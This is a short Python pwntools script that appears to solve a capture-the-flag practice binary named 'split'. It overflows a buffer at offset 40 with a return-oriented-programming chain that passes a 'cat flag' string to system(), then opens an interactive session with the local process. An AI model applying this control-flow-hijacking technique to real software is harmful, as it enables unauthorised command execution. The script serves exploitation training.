from pwn import *

context.arch = "amd64"
elf = context.binary = ELF("./split")


system = 0x0040074b
pop_rdi = 0x4007c3
cat_flag = 0x00601060

offset = 40
payload = flat({
    offset:[
        p64(pop_rdi),
        p64(cat_flag),
        p64(system)
    ]
})

p = process(elf.path)
p.sendlineafter(b"> ", payload)
p.interactive()
